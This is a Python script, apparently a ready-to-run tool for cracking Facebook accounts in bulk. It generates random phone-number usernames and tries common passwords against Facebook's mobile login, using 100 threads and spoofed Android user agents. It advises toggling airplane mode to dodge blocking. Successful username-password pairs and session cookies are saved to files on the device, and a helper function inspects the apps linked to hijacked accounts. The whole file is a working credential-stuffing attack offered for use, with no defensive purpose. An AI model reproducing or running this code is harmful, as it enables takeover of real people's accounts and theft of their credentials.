import os,sys,random,requests,re,time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
loop = 0
oks = []
cps = []
twf =[]
ugen2=[]
ugen=[]
for xd in range(10000):        
    a = str(random.randint(4, 13))
    b = random.choice(['V1818A','M1903C3EG','M1810F6LG','SM-N750K','M2003J15SC','SM-S918B','SM-S918B','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-N986B','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','vivo 1951','vivo 1918','RMX3686','RMX3393','RMX3081','RMX2170','RMX2061','RMX2020','SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B'])
    c = str(random.randint(1, 2))
    d = str(random.randint(1, 9))
    e = str(random.randint(11, 99))
    f = random.choice(["Chrome/","Kiwi Browser/","Puffin/","UCTurbo/","Opera Mini/"])
    g = str(random.randint(1111, 9999))
    h = str(random.randint(111, 999))
    i = str(random.randint(1, 9))
    user_agent = 'Davik/2.1.0 (Linux; U; Android '+a+'.0.0; '+b+' Build/RP1A.'+c+''+d+'0'+i+''+e+') [FBAN/FB4A;FBAV/92.866.944.616;FBPN/com.facebook.katana;FBLC/en_US;FBBV/322216925;FBCR/null;FBMF/'+b+';FBBD/'+b+';FBDV/'+b+';FBSV/'+b+'.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.25,width='+str(h)+',height='+str(g)+'};]'
    ugen.append(user_agent)
cokbrut=[]
ses=requests.Session()

def cek_apk(session,coki):
    w=session.get("https://p.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
def main():
    os.system('clear')
    print(logo)
    print("  \x1b[1;96m║\033[1;97m1\x1b[1;96m║ \033[1;97mPHONE NUMBER CLONE                \x1b[1;96m║")
    print("  \x1b[1;96m║\033[1;97m0\x1b[1;96m║ \033[1;97mEXIT TOOL                         \x1b[1;96m║ ")
    linex()
    DXD = input(f'\x1b[1;96m  ║\033[1;97m?\x1b[1;96m║ \033[1;97mSELECT \033[1;97m:\x1b[1;96m ')
    if DXD in ["1","01"]:
        nmr()
    if DXD in ["0","X"]:        
        os.system('exit')
def nmr():
    user=[]
    os.system('clear')
    print(logo)
    print("\x1b[1;96m  ║\033[1;97m✔\x1b[1;96m║\033[1;97m EXAMPLE : \x1b[1;96m║\033[1;97m789\x1b[1;96m║ ║\033[1;97m440\x1b[1;96m║ ║\033[1;97m670\x1b[1;96m║ ║\033[1;97m250\x1b[1;96m║ ")
    linex()
    code = input('\x1b[1;96m  ║\033[1;97m?\x1b[1;96m║\033[1;97m INPUT YOUR CODE :\x1b[1;96m ')
    os.system('clear')
    print(logo)
    print("\x1b[1;96m  ║\033[1;97m✔\x1b[1;96m║ \033[1;97mEXAMPLE : \x1b[1;96m║\033[1;97m3000\x1b[1;96m║ ║\033[1;97m5000\x1b[1;96m║ ║\033[1;97m10000\x1b[1;96m║ ")
    linex()
    limit=int(input("\x1b[1;96m  ║\x1b[1;96m?\x1b[1;96m║\033[1;97m INPUT YOUR LIMIT :\x1b[1;96m "))
    limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=100) as LuCiFeR:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\x1b[1;96m  ║\033[1;97m✔\x1b[1;96m║ \033[1;97mTOTAL ID       \x1b[1;96m║ \x1b[1;96m'+tl+'                   ')
        print(f'\x1b[1;96m  ║\033[1;97m✔\x1b[1;96m║ \033[1;97mCHOICE CODE    \x1b[1;96m║ \x1b[1;96m'+code+'             ')
        print(f"  \x1b[1;96m║\033[1;97m✔\x1b[1;96m║ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\x1b[1;96mON\x1b[1;96m\033[1;97m═\x1b[1;96mOFF\033[1;97m]\033[1;97mAirplane Mode..\x1b[1;96m!!!")
        linex()
        for love in user:
            uid = '09'+code+love
            pwx = [love,code+love,code+love[:3],'123456','112233','100200','090909','54271180','shwezin123','Myanmar','KaungKaung','maythazin10']
            LuCiFeR.submit(rcrack,uid,pwx,tl)

def rcrack(uid,pwx,tl):
    global loop
    global oks
    global cps
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r \x1b[1;96m〘%sLuCiFeR-XD\033[1;96m〙\033[1;34m\x1b[1;96m〘\033[38;5;195m%s/%s\x1b[1;96m〙\x1b[1;96mOK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = headers = {'authority': 'mbasic.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'method':'GET',
                'path': '/login/device-based/login/async/',
                'scheme': 'https',
                'accept-language': 'as_MM,as;q=0.9',
                'cache-control': 'max-age=0',
              # 'cookie': 'datr=tzGCZUsv3GaM1X0dkQ4qWs7F; vpd=v1%3B800x424x1.445365309715271; fr=1WdwzJFYEiAvHPjTB.AWUot9DqHS9q53xpK2VwXZbngqU.Blhy_O.PL.AAA.0.0.Blhy_O.AWXKu8dDPS4; wl_cbv=v2%3Bclient_version%3A2385%3Btimestamp%3A1703358413; sb=-TaHZcWTHfuTg30F5BVF_u1D; locale=my_MM',
                'referer': 'https://mbasic.facebook.com/intl/save_locale/?loc=my_MM&href=https%3A%2F%2Fmbasic.facebook.com%2F%3Fstype%3Dlo%26deoia%3D1%26jlou%3DAfc5A7rd-0_-6FZDepiz8y_NL9DDiB526AmZiAC6_0ruNtMmZHayIsLG7O1NtZIsXAbM7TpXemnZIym8kjRujw8eOvFgfL4-xncPiVfYtj062w%26smuh%3D32559%26lh%3DAc_S6yQEqpgiYY9q3RM%26wtsid%3Drdr_0wzzdJ27pdno8u38y&index=1&ls_ref=m_basic_locale_footer&ref_component=mbasic_footer&ref_page=%2Fwap%2Findex.php&refid=8',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-model': '""',
                'sec-ch-ua-platform': '"Linux"',
                'sec-ch-ua-platform-version': '""',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'same-origin',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'viewport-width': '980',}
            lo = session.post('https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=1000',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[82:97]
                print(f"\x1b[1;96m 〘OK〙  {uid} ▣ {ps}" '  \n\033[1;97m〘COOKIE〙 = \033[1;97m'+coki+  '')
                open('/sdcard/LOGIN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f"\x1b[1;90m 〘CP〙  {uid} ▣ {ps}")
                open('/sdcard/CHECKPOINT-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

logo= ("""
 ██████  ██   ██ ██████  
 ██   ██  ██ ██  ██   ██ 
 ██   ██   ███   ██   ██ 
 ██   ██  ██ ██  ██   ██ 
 ██████  ██   ██ ██████  
 Created By Draken Kun 
\033[1;97m▣\x1b[1;96m══════════════════\033[1;97m▣\x1b[1;96m══════════════════\033[1;97m▣ """) 
def linex():
	print(f' \033[1;97m ▣\x1b[1;96m══════════════════\033[1;97m▣\x1b[1;96m══════════════════\033[1;97m▣')
main()

